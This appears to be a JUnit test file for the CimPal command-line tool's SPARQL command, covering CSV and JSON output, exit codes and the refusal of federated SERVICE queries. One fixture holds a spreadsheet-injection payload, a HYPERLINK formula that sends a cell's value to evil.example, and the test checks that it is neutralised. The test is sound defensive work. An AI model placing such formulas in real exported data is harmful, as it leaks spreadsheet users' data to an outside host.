/*
 * Copyright (c) 2020-2026 gridDigIt Kft.
 * Licensed under the EUPL-1.2-or-later.
 * SPDX-License-Identifier: EUPL-1.2+
 */
package eu.griddigit.CimPal.cli.command;

import eu.griddigit.CimPal.cli.CimPalCli;
import eu.griddigit.CimPal.cli.CliRun;
import eu.griddigit.CimPal.cli.CliSchemas;
import eu.griddigit.CimPal.cli.ExitCode;
import eu.griddigit.cimpal.core.testsupport.StubHttpServer;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import tools.jackson.databind.JsonNode;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

import static org.assertj.core.api.Assertions.assertThat;

/** {@code sparql} must not send SERVICE requests (SEC-2, gap G3), wherever it is called from. */
class SparqlCommandTest {

    @TempDir
    Path tempDir;

    @Test
    void csvOutputNeutralisesFormulaCells() throws Exception {
        // A model value that a spreadsheet would run as a formula (SEC-5, attestation finding 4).
        Path model = Files.writeString(tempDir.resolve("m.ttl"),
                "<urn:a> <urn:p> \"=HYPERLINK(\\\"https://evil.example/?d=\\\"&A1,\\\"ok\\\")\" .\n");
        Path csv = tempDir.resolve("out.csv");
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        PrintStream origOut = System.out;
        System.setOut(new PrintStream(out, true, StandardCharsets.UTF_8));
        try {
            int exit = CimPalCli.inProcess().execute("sparql", "--models", model.toString(),
                    "--query", "SELECT ?o WHERE { ?s ?p ?o }", "--format", "csv");
            assertThat(exit).isEqualTo(ExitCode.OK);
            assertThat(CimPalCli.inProcess().execute("sparql", "--models", model.toString(),
                    "--query", "SELECT ?o WHERE { ?s ?p ?o }", "--output", csv.toString())).isEqualTo(ExitCode.OK);
        } finally {
            System.setOut(origOut);
        }

        for (String text : new String[] {out.toString(StandardCharsets.UTF_8), Files.readString(csv)}) {
            String cell = text.lines().skip(1).findFirst().orElseThrow();
            assertThat(cell.startsWith("\"") ? cell.substring(1) : cell).as(text).startsWith("'=HYPERLINK");
        }
    }

    // ---- TEST-4: the --format json contract and exit codes ----------------------------------

    @Test
    void jsonModePrintsOneDocumentWithTheRowsInQueryOrder() throws Exception {
        Path model = Files.writeString(tempDir.resolve("m.ttl"),
                "<urn:x:b> <urn:x:p> \"two\" .\n<urn:x:a> <urn:x:p> \"one\" .\n");

        CliRun.Result run = CliRun.run("sparql", "--models", model.toString(),
                "--query", "SELECT ?s ?o WHERE { ?s <urn:x:p> ?o } ORDER BY ?o", "--format", "json");

        assertThat(run.exitCode()).as(run.stderr()).isEqualTo(ExitCode.OK);
        JsonNode json = run.json();
        assertThat(CliSchemas.errors("sparql.schema.json", json)).isEmpty();
        assertThat(json.path("columns")).extracting(JsonNode::asString).containsExactly("s", "o");
        assertThat(json.path("rows")).extracting(row -> row.path("o").asString()).containsExactly("one", "two");
    }

    /**
     * A query with a syntax error is the caller's mistake, but Jena's {@code QueryParseException}
     * is not an {@code IllegalArgumentException}, so the command reports it as exit 3 with a stack
     * trace.
     */
    @org.junit.jupiter.api.Disabled("Suspected bug (TEST-4): a SPARQL syntax error is exit 3 (internal error), not 2")
    @Test
    void aQueryThatDoesNotParseIsBadInputWithNothingOnStdout() throws Exception {
        Path model = Files.writeString(tempDir.resolve("m.ttl"), "<urn:a> <urn:p> \"x\" .\n");

        CliRun.Result run = CliRun.run("sparql", "--models", model.toString(), "--query", "SELECT WHERE {",
                "--format", "json");

        assertThat(run.exitCode()).as(run.stderr()).isEqualTo(ExitCode.INVALID_INPUT);
        assertThat(run.stdout()).isEmpty();
    }

    @Test
    void anOutputThatCannotBeWrittenIsAnInternalError() throws Exception {
        // D3: a natural failure, no hook: the parent of the output is a file.
        Path model = Files.writeString(tempDir.resolve("m.ttl"), "<urn:a> <urn:p> \"x\" .\n");
        Path blocker = Files.writeString(tempDir.resolve("blocker"), "a file, not a folder");

        CliRun.Result run = CliRun.run("sparql", "--models", model.toString(), "--query",
                "SELECT ?o WHERE { ?s ?p ?o }", "--format", "json",
                "--summary-file", blocker.resolve("summary.json").toString());

        assertThat(run.exitCode()).as(run.stderr()).isEqualTo(ExitCode.INTERNAL_ERROR);
        assertThat(run.stdout()).isEmpty();
    }

    @Test
    void serviceQueryIsRefusedWithExit2AndNoRequestIsSent() throws Exception {
        Path model = Files.writeString(tempDir.resolve("m.ttl"), "<urn:a> <urn:p> \"x\" .\n");
        String results = "{\"head\":{\"vars\":[\"s\"]},\"results\":{\"bindings\":[]}}";
        ByteArrayOutputStream err = new ByteArrayOutputStream();
        PrintStream origErr = System.err;
        try (StubHttpServer stub = StubHttpServer.start().serve("/sparql", results, "application/sparql-results+json")) {
            String query = "SELECT * WHERE { SERVICE <" + stub.uri("/sparql") + "> { ?s ?p ?o } }";
            System.setErr(new PrintStream(err, true, StandardCharsets.UTF_8));
            int exit;
            try {
                exit = CimPalCli.inProcess().execute("sparql", "--models", model.toString(), "--query", query,
                        "--format", "json");
            } finally {
                System.setErr(origErr);
            }

            assertThat(exit).isEqualTo(ExitCode.INVALID_INPUT);
            assertThat(stub.requests()).isEmpty();
            // The refusal itself, not some other bad-input error that merely echoes the query.
            assertThat(err.toString(StandardCharsets.UTF_8))
                    .contains("SPARQL SERVICE (federated query) is not allowed")
                    .doesNotContain("Illegal char").doesNotContain("\tat ");
        }
    }
}
